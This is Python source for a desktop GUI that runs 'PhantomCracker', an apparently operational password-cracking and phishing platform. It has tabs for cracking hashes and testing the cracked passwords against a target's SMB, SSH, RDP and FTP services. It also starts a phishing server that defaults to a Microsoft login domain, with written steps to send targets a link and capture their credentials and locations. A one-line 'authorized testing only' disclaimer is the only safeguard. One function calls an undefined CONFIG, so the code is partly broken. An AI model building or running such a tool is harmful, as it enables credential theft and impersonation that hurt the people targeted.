#!/usr/bin/env python3
"""
PhantomCracker GUI — Desktop Application for Password Cracking & Phishing
Method 3: Tkinter GUI with tabs for all features
"""

import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import subprocess
import threading
import os
import sys
import signal
import webbrowser
from pathlib import Path

# Configuration
HOME = Path("/root/phantomcracker")
MAIN_SCRIPT = str(HOME / "phantomcracker.py")
VERSION = "2.0"

# Colors (dark theme)
BG_DARK = "#0d1117"
BG_MEDIUM = "#161b22"
BG_LIGHT = "#21262d"
TEXT_PRIMARY = "#c9d1d9"
TEXT_SECONDARY = "#8b949e"
TEXT_GREEN = "#3fb950"
TEXT_RED = "#f85149"
TEXT_BLUE = "#58a6ff"
TEXT_PURPLE = "#bc8cff"
BORDER = "#30363d"
INPUT_BG = "#0d1117"
BTN_GREEN = "#238636"
BTN_BLUE = "#1f6feb"
BTN_RED = "#da3633"


class PhantomCrackerApp:
    def __init__(self, root):
        self.root = root
        self.root.title(f"PhantomCracker v{VERSION}")
        self.root.geometry("900x750")
        self.root.configure(bg=BG_DARK)
        self.root.minsize(800, 650)
        
        # Set icon (optional)
        try:
            self.root.iconbitmap(default='')
        except:
            pass
        
        # Track running processes
        self.phish_process = None
        self.dash_process = None
        self.crack_process = None
        
        # Build UI
        self.build_menu()
        self.build_main()
        
        # Handle close
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
    
    def build_menu(self):
        """Build top menu bar."""
        menubar = tk.Menu(self.root, bg=BG_MEDIUM, fg=TEXT_PRIMARY, activebackground=BG_LIGHT)
        
        file_menu = tk.Menu(menubar, tearoff=0, bg=BG_MEDIUM, fg=TEXT_PRIMARY, activebackground=BG_LIGHT)
        file_menu.add_command(label="Exit", command=self.on_close, accelerator="Ctrl+Q")
        menubar.add_cascade(label="File", menu=file_menu)
        
        tools_menu = tk.Menu(menubar, tearoff=0, bg=BG_MEDIUM, fg=TEXT_PRIMARY, activebackground=BG_LIGHT)
        tools_menu.add_command(label="Clear Output", command=self.clear_output)
        tools_menu.add_command(label="Open Database Folder", command=self.open_db_folder)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        
        help_menu = tk.Menu(menubar, tearoff=0, bg=BG_MEDIUM, fg=TEXT_PRIMARY, activebackground=BG_LIGHT)
        help_menu.add_command(label="About", command=self.show_about)
        menubar.add_cascade(label="Help", menu=help_menu)
        
        self.root.config(menu=menubar)
    
    def build_main(self):
        """Build the main application UI."""
        # Main container
        main_frame = tk.Frame(self.root, bg=BG_DARK)
        main_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Header
        header = tk.Frame(main_frame, bg=BG_DARK)
        header.pack(fill='x', pady=(0, 10))
        
        title = tk.Label(header, text=f"PhantomCracker v{VERSION}", 
                        font=('Arial', 22, 'bold'), bg=BG_DARK, fg=TEXT_BLUE)
        title.pack(side='left')
        
        subtitle = tk.Label(header, text="Password Cracking & Phishing Platform",
                           font=('Arial', 10), bg=BG_DARK, fg=TEXT_SECONDARY)
        subtitle.pack(side='left', padx=(10, 0), pady=(8, 0))
        
        # Status indicator
        self.status_light = tk.Canvas(header, width=12, height=12, bg=BG_DARK, highlightthickness=0)
        self.status_light.pack(side='right', padx=(0, 5), pady=(8, 0))
        self.status_dot = self.status_light.create_oval(2, 2, 10, 10, fill=TEXT_GREEN, outline='')
        
        status_text = tk.Label(header, text="Ready", font=('Arial', 9), bg=BG_DARK, fg=TEXT_GREEN)
        status_text.pack(side='right', pady=(8, 0))
        
        # Notebook (tabs)
        self.notebook = ttk.Notebook(main_frame)
        self.notebook.pack(fill='both', expand=True)
        
        # Style the notebook
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TNotebook', background=BG_DARK, borderwidth=0)
        style.configure('TNotebook.Tab', background=BG_MEDIUM, foreground=TEXT_PRIMARY, 
                       padding=[15, 5], borderwidth=1, focuscolor='none')
        style.map('TNotebook.Tab', background=[('selected', BG_LIGHT)], 
                 foreground=[('selected', TEXT_BLUE)])
        
        # Create tabs
        self.build_crack_tab()
        self.build_phish_tab()
        self.build_dash_tab()
        self.build_info_tab()
        
        # Output area
        output_label = tk.Label(main_frame, text="Output Log", font=('Arial', 10, 'bold'),
                               bg=BG_DARK, fg=TEXT_PRIMARY, anchor='w')
        output_label.pack(fill='x', pady=(10, 2))
        
        self.output = scrolledtext.ScrolledText(
            main_frame, height=12, bg=INPUT_BG, fg=TEXT_GREEN,
            font=('Courier New', 10), insertbackground='white',
            borderwidth=1, relief='solid', highlightbackground=BORDER,
            highlightcolor=TEXT_BLUE, highlightthickness=1
        )
        self.output.pack(fill='both', pady=(0, 5))
        self.output.insert('end', "[*] PhantomCracker GUI started. Select an option to begin.\n")
        
        # Bottom status bar
        status_bar = tk.Frame(main_frame, bg=BG_MEDIUM, height=25)
        status_bar.pack(fill='x')
        
        self.status_label = tk.Label(status_bar, text="Ready", anchor='w', padx=10,
                                     bg=BG_MEDIUM, fg=TEXT_SECONDARY, font=('Arial', 9))
        self.status_label.pack(side='left')
        
        # Version
        tk.Label(status_bar, text=f"v{VERSION}", anchor='e', padx=10,
                bg=BG_MEDIUM, fg=TEXT_SECONDARY, font=('Arial', 9)).pack(side='right')
    
    def build_crack_tab(self):
        """Build the password cracking tab."""
        f = ttk.Frame(self.notebook)
        self.notebook.add(f, text='  🔓 Crack  ')
        
        # Hash File Selection
        row = 0
        tk.Label(f, text="Hash File:", font=('Arial', 10), fg=TEXT_PRIMARY, bg=BG_MEDIUM).grid(
            row=row, column=0, sticky='w', padx=15, pady=(15, 5))
        
        hash_frame = tk.Frame(f, bg=BG_MEDIUM)
        hash_frame.grid(row=row, column=1, columnspan=2, sticky='ew', padx=5, pady=(15, 5))
        
        self.hash_file = tk.Entry(hash_frame, width=60, bg=INPUT_BG, fg=TEXT_PRIMARY,
                                 insertbackground='white', relief='solid', borderwidth=1,
                                 highlightbackground=BORDER, highlightthickness=1)
        self.hash_file.pack(side='left', fill='x', expand=True)
        
        tk.Button(hash_frame, text="Browse", command=self.browse_hash_file,
                 bg=BG_LIGHT, fg=TEXT_PRIMARY, relief='flat', padx=10,
                 activebackground=BORDER, cursor='hand2').pack(side='left', padx=(5, 0))
        
        # Quick test button
        tk.Button(hash_frame, text="Test Hash", command=self.create_test_hashes,
                 bg='#1a3a1a', fg=TEXT_GREEN, relief='flat', padx=8,
                 activebackground='#2a5a2a', cursor='hand2', font=('Arial', 8)).pack(side='left', padx=(5, 0))
        
        # Hash Mode
        row += 1
        tk.Label(f, text="Hash Mode:", font=('Arial', 10), fg=TEXT_PRIMARY, bg=BG_MEDIUM).grid(
            row=row, column=0, sticky='w', padx=15, pady=5)
        
        mode_frame = tk.Frame(f, bg=BG_MEDIUM)
        mode_frame.grid(row=row, column=1, columnspan=2, sticky='w', padx=5, pady=5)
        
        self.mode = tk.Entry(mode_frame, width=10, bg=INPUT_BG, fg=TEXT_PRIMARY,
                            insertbackground='white', relief='solid', borderwidth=1,
                            highlightbackground=BORDER, highlightthickness=1)
        self.mode.pack(side='left')
        
        tk.Label(mode_frame, text="(leave empty for auto-detect)", 
                font=('Arial', 9), fg=TEXT_SECONDARY, bg=BG_MEDIUM).pack(side='left', padx=(10, 0))
        
        # Quick mode selector
        modes_frame = tk.Frame(f, bg=BG_MEDIUM)
        modes_frame.grid(row=row, column=1, columnspan=2, sticky='w', padx=(200, 5), pady=5)
        
        for label, m in [("MD5", "0"), ("NTLM", "1000"), ("SHA1", "100"), ("SHA256", "1400"), ("bcrypt", "3200")]:
            tk.Button(modes_frame, text=label, command=lambda v=m: self.set_mode(v),
                     bg=BG_LIGHT, fg=TEXT_BLUE, relief='flat', padx=5, pady=0,
                     activebackground=BORDER, cursor='hand2', font=('Arial', 8)).pack(side='left', padx=2)
        
        # Wordlist
        row += 1
        tk.Label(f, text="Wordlist:", font=('Arial', 10), fg=TEXT_PRIMARY, bg=BG_MEDIUM).grid(
            row=row, column=0, sticky='w', padx=15, pady=5)
        
        wl_frame = tk.Frame(f, bg=BG_MEDIUM)
        wl_frame.grid(row=row, column=1, columnspan=2, sticky='ew', padx=5, pady=5)
        
        self.wordlist = tk.Entry(wl_frame, width=60, bg=INPUT_BG, fg=TEXT_PRIMARY,
                                insertbackground='white', relief='solid', borderwidth=1,
                                highlightbackground=BORDER, highlightthickness=1)
        self.wordlist.insert(0, '/usr/share/wordlists/rockyou.txt')
        self.wordlist.pack(side='left', fill='x', expand=True)
        
        tk.Button(wl_frame, text="Browse", command=self.browse_wordlist,
                 bg=BG_LIGHT, fg=TEXT_PRIMARY, relief='flat', padx=10,
                 activebackground=BORDER, cursor='hand2').pack(side='left', padx=(5, 0))
        
        # Attack Type
        row += 1
        tk.Label(f, text="Attack Type:", font=('Arial', 10), fg=TEXT_PRIMARY, bg=BG_MEDIUM).grid(
            row=row, column=0, sticky='w', padx=15, pady=5)
        
        self.attack_var = tk.StringVar(value="progressive")
        attacks_frame = tk.Frame(f, bg=BG_MEDIUM)
        attacks_frame.grid(row=row, column=1, columnspan=2, sticky='w', padx=5, pady=5)
        
        attacks = [("Progressive", "progressive"), ("Dictionary", "dictionary"), 
                  ("Dict+Rules", "rules"), ("Mask", "mask")]
        for i, (label, val) in enumerate(attacks):
            rb = tk.Radiobutton(attacks_frame, text=label, variable=self.attack_var, value=val,
                               bg=BG_MEDIUM, fg=TEXT_PRIMARY, selectcolor=BG_DARK,
                               activebackground=BG_MEDIUM, activeforeground=TEXT_BLUE,
                               cursor='hand2')
            rb.pack(side='left', padx=(0, 15))
        
        # Validation Section
        row += 1
        separator = tk.Frame(f, height=1, bg=BORDER)
        separator.grid(row=row, column=0, columnspan=3, sticky='ew', padx=15, pady=10)
        
        row += 1
        tk.Label(f, text="Validation (Optional):", font=('Arial', 10, 'bold'),
                fg=TEXT_BLUE, bg=BG_MEDIUM).grid(row=row, column=0, columnspan=3, sticky='w', padx=15, pady=(0, 5))
        
        row += 1
        tk.Label(f, text="Target IP:", font=('Arial', 10), fg=TEXT_PRIMARY, bg=BG_MEDIUM).grid(
            row=row, column=0, sticky='w', padx=15, pady=5)
        
        self.validate_ip = tk.Entry(f, width=20, bg=INPUT_BG, fg=TEXT_PRIMARY,
                                   insertbackground='white', relief='solid', borderwidth=1,
                                   highlightbackground=BORDER, highlightthickness=1)
        self.validate_ip.grid(row=row, column=1, sticky='w', padx=5, pady=5)
        tk.Label(f, text="(e.g. 192.168.1.100)", font=('Arial', 9), fg=TEXT_SECONDARY, bg=BG_MEDIUM).grid(
            row=row, column=2, sticky='w', padx=5, pady=5)
        
        # Services checkboxes
        row += 1
        tk.Label(f, text="Services:", font=('Arial', 10), fg=TEXT_PRIMARY, bg=BG_MEDIUM).grid(
            row=row, column=0, sticky='w', padx=15, pady=5)
        
        services_frame = tk.Frame(f, bg=BG_MEDIUM)
        services_frame.grid(row=row, column=1, columnspan=2, sticky='w', padx=5, pady=5)
        
        self.smb_var = tk.BooleanVar(value=True)
        self.ssh_var = tk.BooleanVar()
        self.rdp_var = tk.BooleanVar()
        self.ftp_var = tk.BooleanVar()
        
        for var, label in [(self.smb_var, "SMB"), (self.ssh_var, "SSH"), 
                          (self.rdp_var, "RDP"), (self.ftp_var, "FTP")]:
            cb = tk.Checkbutton(services_frame, text=label, variable=var,
                               bg=BG_MEDIUM, fg=TEXT_PRIMARY, selectcolor=BG_DARK,
                               activebackground=BG_MEDIUM, activeforeground=TEXT_BLUE,
                               cursor='hand2')
            cb.pack(side='left', padx=(0, 10))
        
        # Action buttons
        row += 1
        btn_frame = tk.Frame(f, bg=BG_MEDIUM)
        btn_frame.grid(row=row, column=0, columnspan=3, pady=(20, 15))
        
        tk.Button(btn_frame, text="▶ Start Cracking", command=self.start_crack,
                 bg=BTN_GREEN, fg='white', font=('Arial', 12, 'bold'), relief='flat',
                 padx=25, pady=8, activebackground='#2ea043', cursor='hand2').pack(side='left', padx=10)
        
        tk.Button(btn_frame, text="⏹ Stop Cracking", command=self.stop_crack,
                 bg=BTN_RED, fg='white', font=('Arial', 10), relief='flat',
                 padx=15, pady=8, activebackground='#f85149', cursor='hand2').pack(side='left', padx=10)
        
        tk.Button(btn_frame, text="📋 Show Cracked", command=self.show_cracked,
                 bg=BTN_BLUE, fg='white', font=('Arial', 10), relief='flat',
                 padx=15, pady=8, activebackground='#388bfd', cursor='hand2').pack(side='left', padx=10)
    
    def build_phish_tab(self):
        """Build the phishing server tab."""
        f = ttk.Frame(self.notebook)
        self.notebook.add(f, text='  🎣 Phish  ')
        
        # Server Configuration
        row = 0
        tk.Label(f, text="Server Configuration", font=('Arial', 14, 'bold'),
                fg=TEXT_BLUE, bg=BG_MEDIUM).grid(row=row, column=0, columnspan=3, sticky='w', padx=15, pady=(15, 10))
        
        row += 1
        tk.Label(f, text="Port:", font=('Arial', 10), fg=TEXT_PRIMARY, bg=BG_MEDIUM).grid(
            row=row, column=0, sticky='w', padx=15, pady=5)
        
        port_frame = tk.Frame(f, bg=BG_MEDIUM)
        port_frame.grid(row=row, column=1, columnspan=2, sticky='w', padx=5, pady=5)
        
        self.phish_port = tk.Entry(port_frame, width=10, bg=INPUT_BG, fg=TEXT_PRIMARY,
                                  insertbackground='white', relief='solid', borderwidth=1,
                                  highlightbackground=BORDER, highlightthickness=1)
        self.phish_port.insert(0, '443')
        self.phish_port.pack(side='left')
        
        tk.Label(port_frame, text="(use 80 for HTTP, 443 for HTTPS)", 
                font=('Arial', 9), fg=TEXT_SECONDARY, bg=BG_MEDIUM).pack(side='left', padx=(10, 0))
        
        row += 1
        tk.Label(f, text="Domain:", font=('Arial', 10), fg=TEXT_PRIMARY, bg=BG_MEDIUM).grid(
            row=row, column=0, sticky='w', padx=15, pady=5)
        
        domain_frame = tk.Frame(f, bg=BG_MEDIUM)
        domain_frame.grid(row=row, column=1, columnspan=2, sticky='ew', padx=5, pady=5)
        
        self.phish_domain = tk.Entry(domain_frame, width=40, bg=INPUT_BG, fg=TEXT_PRIMARY,
                                    insertbackground='white', relief='solid', borderwidth=1,
                                    highlightbackground=BORDER, highlightthickness=1)
        self.phish_domain.insert(0, 'login.microsoft.com')
        self.phish_domain.pack(side='left', fill='x', expand=True)
        
        row += 1
        self.http_var = tk.BooleanVar()
        http_cb = tk.Checkbutton(f, text="Use HTTP (no SSL certificate needed)",
                                variable=self.http_var, bg=BG_MEDIUM, fg=TEXT_PRIMARY,
                                selectcolor=BG_DARK, activebackground=BG_MEDIUM,
                                activeforeground=TEXT_BLUE, cursor='hand2')
        http_cb.grid(row=row, column=1, sticky='w', padx=5, pady=5)
        
        # Server Status
        row += 1
        status_frame = tk.LabelFrame(f, text="Server Status", font=('Arial', 10, 'bold'),
                                     bg=BG_MEDIUM, fg=TEXT_PRIMARY, borderwidth=1,
                                     highlightbackground=BORDER)
        status_frame.grid(row=row, column=0, columnspan=3, sticky='ew', padx=15, pady=(15, 5))
        
        self.phish_status = tk.Label(status_frame, text="● Not Running", font=('Arial', 12),
                                    fg=TEXT_RED, bg=BG_MEDIUM, pady=10)
        self.phish_status.pack()
        
        # Info box
        row += 1
        info_frame = tk.LabelFrame(f, text="How It Works", font=('Arial', 10, 'bold'),
                                   bg=BG_MEDIUM, fg=TEXT_PRIMARY, borderwidth=1,
                                   highlightbackground=BORDER)
        info_frame.grid(row=row, column=0, columnspan=3, sticky='ew', padx=15, pady=(10, 5))
        
        info_text = """1. Start the phishing server (port 80 for HTTP or 443 for HTTPS)
2. Send your targets a link: http://YOUR_IP:PORT
3. When they visit, their IP and location are logged
4. If they enter credentials, they are captured
5. View all data in real-time on the Dashboard tab"""
        
        tk.Label(info_frame, text=info_text, font=('Arial', 9), fg=TEXT_SECONDARY,
                bg=BG_MEDIUM, justify='left', pady=5).pack(padx=10)
        
        # Action buttons
        row += 1
        btn_frame = tk.Frame(f, bg=BG_MEDIUM)
        btn_frame.grid(row=row, column=0, columnspan=3, pady=(20, 15))
        
        tk.Button(btn_frame, text="▶ Start Server", command=self.start_phish,
                 bg=BTN_GREEN, fg='white', font=('Arial', 12, 'bold'), relief='flat',
                 padx=25, pady=8, activebackground='#2ea043', cursor='hand2').pack(side='left', padx=10)
        
        tk.Button(btn_frame, text="⏹ Stop Server", command=self.stop_phish,
                 bg=BTN_RED, fg='white', font=('Arial', 10), relief='flat',
                 padx=15, pady=8, activebackground='#f85149', cursor='hand2').pack(side='left', padx=10)
        
        tk.Button(btn_frame, text="🌐 Open Phishing Page", command=self.open_phish_page,
                 bg=BTN_BLUE, fg='white', font=('Arial', 10), relief='flat',
                 padx=15, pady=8, activebackground='#388bfd', cursor='hand2').pack(side='left', padx=10)
    
    def build_dash_tab(self):
        """Build the dashboard tab."""
        f = ttk.Frame(self.notebook)
        self.notebook.add(f, text='  📊 Dashboard  ')
        
        # Dashboard info
        row = 0
        tk.Label(f, text="Real-Time Dashboard", font=('Arial', 14, 'bold'),
                fg=TEXT_PURPLE, bg=BG_MEDIUM).grid(row=row, column=0, columnspan=3, sticky='w', padx=15, pady=(15, 10))
        
        row += 1
        tk.Label(f, text="Port:", font=('Arial', 10), fg=TEXT_PRIMARY, bg=BG_MEDIUM).grid(
            row=row, column=0, sticky='w', padx=15, pady=5)
        
        self.dash_port = tk.Entry(f, width=10, bg=INPUT_BG, fg=TEXT_PRIMARY,
                                 insertbackground='white', relief='solid', borderwidth=1,
                                 highlightbackground=BORDER, highlightthickness=1)
        self.dash_port.insert(0, '8080')
        self.dash_port.grid(row=row, column=1, sticky='w', padx=5, pady=5)
        
        # Dashboard Status
        row += 1
        status_frame = tk.LabelFrame(f, text="Dashboard Status", font=('Arial', 10, 'bold'),
                                     bg=BG_MEDIUM, fg=TEXT_PRIMARY, borderwidth=1,
                                     highlightbackground=BORDER)
        status_frame.grid(row=row, column=0, columnspan=3, sticky='ew', padx=15, pady=(15, 5))
        
        self.dash_status = tk.Label(status_frame, text="● Not Running", font=('Arial', 12),
                                   fg=TEXT_RED, bg=BG_MEDIUM, pady=10)
        self.dash_status.pack()
        
        # Info box
        row += 1
        info_frame = tk.LabelFrame(f, text="Dashboard Features", font=('Arial', 10, 'bold'),
                                   bg=BG_MEDIUM, fg=TEXT_PRIMARY, borderwidth=1,
                                   highlightbackground=BORDER)
        info_frame.grid(row=row, column=0, columnspan=3, sticky='ew', padx=15, pady=(10, 5))
        
        dash_info = """• Real-time map showing visitor locations
• Live activity log of all events
• Stats: cracked passwords, visits, credentials captured
• Tables showing recent visits and cracked passwords
• Auto-refreshes every 3 seconds"""
        
        tk.Label(info_frame, text=dash_info, font=('Arial', 9), fg=TEXT_SECONDARY,
                bg=BG_MEDIUM, justify='left', pady=5).pack(padx=10)
        
        # Action buttons
        row += 1
        btn_frame = tk.Frame(f, bg=BG_MEDIUM)
        btn_frame.grid(row=row, column=0, columnspan=3, pady=(20, 15))
        
        tk.Button(btn_frame, text="▶ Start Dashboard", command=self.start_dash,
                 bg=BTN_GREEN, fg='white', font=('Arial', 12, 'bold'), relief='flat',
                 padx=25, pady=8, activebackground='#2ea043', cursor='hand2').pack(side='left', padx=10)
        
        tk.Button(btn_frame, text="⏹ Stop Dashboard", command=self.stop_dash,
                 bg=BTN_RED, fg='white', font=('Arial', 10), relief='flat',
                 padx=15, pady=8, activebackground='#f85149', cursor='hand2').pack(side='left', padx=10)
        
        tk.Button(btn_frame, text="🌐 Open in Browser", command=self.open_dash_browser,
                 bg=BTN_BLUE, fg='white', font=('Arial', 12, 'bold'), relief='flat',
                 padx=20, pady=8, activebackground='#388bfd', cursor='hand2').pack(side='left', padx=10)
    
    def build_info_tab(self):
        """Build the system info tab."""
        f = ttk.Frame(self.notebook)
        self.notebook.add(f, text='  ℹ️ Info  ')
        
        # System Information
        row = 0
        tk.Label(f, text="System Information", font=('Arial', 14, 'bold'),
                fg=TEXT_GREEN, bg=BG_MEDIUM).grid(row=row, column=0, columnspan=2, sticky='w', padx=15, pady=(15, 10))
        
        # Info display
        self.info_text = tk.Text(f, bg=INPUT_BG, fg=TEXT_GREEN, font=('Courier New', 10),
                                 borderwidth=1, relief='solid', highlightbackground=BORDER,
                                 highlightthickness=1, padx=10, pady=10)
        self.info_text.grid(row=row+1, column=0, columnspan=2, sticky='nsew', padx=15, pady=5)
        
        # Scrollbar for info
        scroll = tk.Scrollbar(f, command=self.info_text.yview)
        scroll.grid(row=row+1, column=2, sticky='ns', pady=5)
        self.info_text.config(yscrollcommand=scroll.set)
        
        # Refresh button
        tk.Button(f, text="🔄 Refresh Info", command=self.refresh_info,
                 bg=BTN_BLUE, fg='white', font=('Arial', 10), relief='flat',
                 padx=15, pady=5, activebackground='#388bfd', cursor='hand2').grid(
                 row=row+2, column=0, pady=10)
        
        # Configure grid weights
        f.grid_rowconfigure(row+1, weight=1)
        f.grid_columnconfigure(0, weight=1)
        
        # Load info
        self.refresh_info()
    
    # ==================== CRACKING METHODS ====================
    
    def browse_hash_file(self):
        filename = filedialog.askopenfilename(
            title="Select Hash File",
            filetypes=[("Hash files", "*.txt *.hash *.hashes"), ("All files", "*.*")]
        )
        if filename:
            self.hash_file.delete(0, 'end')
            self.hash_file.insert(0, filename)
            self.log(f"[+] Selected hash file: {filename}")
    
    def browse_wordlist(self):
        filename = filedialog.askopenfilename(
            title="Select Wordlist",
            filetypes=[("Wordlist", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            self.wordlist.delete(0, 'end')
            self.wordlist.insert(0, filename)
            self.log(f"[+] Selected wordlist: {filename}")
    
    def set_mode(self, mode):
        self.mode.delete(0, 'end')
        self.mode.insert(0, mode)
    
    def create_test_hashes(self):
        test_file = str(HOME / "test_hashes.txt")
        with open(test_file, 'w') as f:
            f.write("5f4dcc3b5aa765d61d8327deb882cf99\n")  # password
            f.write("e99a18c428cb38d5f260853678922e03\n")  # abc123
            f.write("827ccb0eea8a706c4c34a16891f84e7b\n")  # 12345
        self.hash_file.delete(0, 'end')
        self.hash_file.insert(0, test_file)
        self.log(f"[+] Created test hashes: {test_file}")
    
    def start_crack(self):
        hash_file = self.hash_file.get().strip()
        if not hash_file:
            messagebox.showerror("Error", "Please select a hash file first")
            return
        
        self.log("[*] Starting crack session...")
        self.set_status("Cracking...")
        
        def run():
            cmd = ['python3', MAIN_SCRIPT, 'crack', hash_file]
            
            mode = self.mode.get().strip()
            if mode:
                cmd.extend(['-m', mode])
            
            cmd.extend(['--attack', self.attack_var.get()])
            
            if self.wordlist.get().strip():
                cmd.extend(['--wordlist', self.wordlist.get().strip()])
            
            validate = self.validate_ip.get().strip()
            if validate:
                cmd.extend(['--validate', validate])
                services = []
                if self.smb_var.get(): services.append('smb')
                if self.ssh_var.get(): services.append('ssh')
                if self.rdp_var.get(): services.append('rdp')
                if self.ftp_var.get(): services.append('ftp')
                if services:
                    cmd.extend(['-s'] + services)
            
            self.log(f"[*] Command: {' '.join(cmd)}")
            self.log("[*] Output will appear below...\n")
            
            try:
                self.crack_process = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    universal_newlines=True, bufsize=1
                )
                
                for line in iter(self.crack_process.stdout.readline, ''):
                    if line.strip():
                        self.log(line.strip())
                
                self.crack_process.wait()
                self.log("\n[+] Cracking session completed")
                self.set_status("Ready")
                
            except Exception as e:
                self.log(f"[!] Error: {e}")
                self.set_status("Error")
            finally:
                self.crack_process = None
        
        threading.Thread(target=run, daemon=True).start()
    
    def stop_crack(self):
        if self.crack_process:
            self.crack_process.terminate()
            self.log("[-] Cracking stopped by user")
            self.crack_process = None
            self.set_status("Stopped")
    
    def show_cracked(self):
        def run():
            try:
                hash_file = self.hash_file.get().strip()
                if not hash_file:
                    # Just query the database directly
                    db_path = str(Path.home() / ".phantomcracker" / "phantom.db")
                    if os.path.exists(db_path):
                        r = subprocess.run(['sqlite3', db_path, 
                            "SELECT hash, password, method, cracked_at FROM cracked ORDER BY cracked_at DESC LIMIT 20"],
                            capture_output=True, text=True, timeout=5)
                        if r.stdout.strip():
                            self.log("[*] Recently cracked passwords:\n" + r.stdout)
                        else:
                            self.log("[!] No cracked passwords found in database")
                    else:
                        self.log("[!] No database found. Crack something first.")
                    return
                
                mode = self.mode.get().strip() or "1000"
                r = subprocess.run(
                    [CONFIG["hashcat"], "-m", mode, "--show", "--potfile-path", CONFIG["potfile"], hash_file],
                    capture_output=True, text=True, timeout=10
                )
                if r.stdout.strip():
                    self.log("[*] Cracked passwords:")
                    for line in r.stdout.strip().split('\n'):
                        if ':' in line:
                            parts = line.split(':', 1)
                            self.log(f"  {parts[0][:24]}... → {parts[1]}")
                else:
                    self.log("[!] Nothing cracked yet")
            except Exception as e:
                self.log(f"[!] Error: {e}")
        
        threading.Thread(target=run, daemon=True).start()
    
    # ==================== PHISHING METHODS ====================
    
    def start_phish(self):
        self.phish_status.config(text="● Starting...", fg=TEXT_BLUE)
        self.log("[*] Starting phishing server...")
        
        def run():
            try:
                port = self.phish_port.get().strip() or "80"
                
                cmd = ['python3', MAIN_SCRIPT, 'phish', '--port', port]
                
                if self.http_var.get():
                    cmd.append('--http')
                    protocol = "http"
                else:
                    protocol = "https"
                
                self.log(f"[*] Starting server on {protocol}://0.0.0.0:{port}")
                self.log("[*] Your phishing page is now live!")
                
                self.phish_process = subprocess.Popen(cmd)
                self.phish_status.config(text=f"● Running on port {port}", fg=TEXT_GREEN)
                
                self.phish_process.wait()
            except Exception as e:
                self.log(f"[!] Phishing server error: {e}")
                self.phish_status.config(text="● Error", fg=TEXT_RED)
            finally:
                self.phish_process = None
        
        threading.Thread(target=run, daemon=True).start()
    
    def stop_phish(self):
        subprocess.run(['pkill', '-f', f'phantomcracker.py phish'], capture_output=True)
        if self.phish_process:
            self.phish_process.terminate()
            self.phish_process = None
        self.phish_status.config(text="● Stopped", fg=TEXT_RED)
        self.log("[-] Phishing server stopped")
    
    def open_phish_page(self):
        port = self.phish_port.get().strip() or "80"
        protocol = "http" if self.http_var.get() else "https"
        webbrowser.open(f"{protocol}://localhost:{port}")
    
    # ==================== DASHBOARD METHODS ====================
    
    def start_dash(self):
        self.dash_status.config(text="● Starting...", fg=TEXT_BLUE)
        self.log("[*] Starting dashboard...")
        
        def run():
            try:
                port = self.dash_port.get().strip() or "8080"
                
                cmd = ['python3', MAIN_SCRIPT, 'dashboard', '--port', port]
                
                self.log(f"[*] Dashboard starting at http://localhost:{port}")
                
                self.dash_process = subprocess.Popen(cmd)
                self.dash_status.config(text=f"● Running on port {port}", fg=TEXT_GREEN)
                
                # Auto-open browser
                webbrowser.open(f"http://localhost:{port}")
                
                self.dash_process.wait()
            except Exception as e:
                self.log(f"[!] Dashboard error: {e}")
                self.dash_status.config(text="● Error", fg=TEXT_RED)
            finally:
                self.dash_process = None
        
        threading.Thread(target=run, daemon=True).start()
    
    def stop_dash(self):
        subprocess.run(['pkill', '-f', f'phantomcracker.py dashboard'], capture_output=True)
        if self.dash_process:
            self.dash_process.terminate()
            self.dash_process = None
        self.dash_status.config(text="● Stopped", fg=TEXT_RED)
        self.log("[-] Dashboard stopped")
    
    def open_dash_browser(self):
        port = self.dash_port.get().strip() or "8080"
        webbrowser.open(f"http://localhost:{port}")
    
    # ==================== UTILITY METHODS ====================
    
    def refresh_info(self):
        def run():
            try:
                r = subprocess.run(['python3', MAIN_SCRIPT, 'info'],
                                  capture_output=True, text=True, timeout=15)
                self.info_text.delete('1.0', 'end')
                self.info_text.insert('1.0', r.stdout + r.stderr)
            except Exception as e:
                self.info_text.delete('1.0', 'end')
                self.info_text.insert('1.0', f"Error getting system info: {e}")
        
        threading.Thread(target=run, daemon=True).start()
    
    def clear_output(self):
        self.output.delete('1.0', 'end')
    
    def open_db_folder(self):
        db_path = str(Path.home() / ".phantomcracker")
        subprocess.run(['xdg-open', db_path])
    
    def show_about(self):
        messagebox.showinfo("About PhantomCracker",
            f"PhantomCracker v{VERSION}\n\n"
            "Unified Password Cracking & Phishing Assessment Platform\n\n"
            "For authorized penetration testing only.\n\n"
            "Features:\n"
            "• Password cracking (hashcat + John)\n"
            "• Phishing server with geolocation\n"
            "• Real-time dashboard with map\n"
            "• Credential validation against live services\n"
            "• Telegram alerts\n\n"
            "Built with: Python, Tkinter, hashcat, John, Hydra")
    
    def log(self, msg):
        """Add a message to the output log."""
        self.output.insert('end', msg + '\n')
        self.output.see('end')
        self.root.update_idletasks()
    
    def set_status(self, status):
        """Update status bar."""
        self.status_label.config(text=status)
        
        colors = {"Ready": TEXT_GREEN, "Cracking...": TEXT_BLUE, "Stopped": TEXT_RED, "Error": TEXT_RED}
        color = colors.get(status, TEXT_SECONDARY)
        self.status_light.itemconfig(self.status_dot, fill=color)
    
    def on_close(self):
        """Clean up when window is closed."""
        self.log("[-] Shutting down...")
        
        # Kill background processes
        if self.phish_process:
            self.phish_process.terminate()
        if self.dash_process:
            self.dash_process.terminate()
        if self.crack_process:
            self.crack_process.terminate()
        
        subprocess.run(['pkill', '-f', 'phantomcracker.py phish'], capture_output=True)
        subprocess.run(['pkill', '-f', 'phantomcracker.py dashboard'], capture_output=True)
        
        self.root.destroy()


if __name__ == '__main__':
    # Check if running as root
    if os.geteuid() != 0:
        print("[!] Some features require root (phishing on port 80/443)")
    
    root = tk.Tk()
    app = PhantomCrackerApp(root)
    root.mainloop()
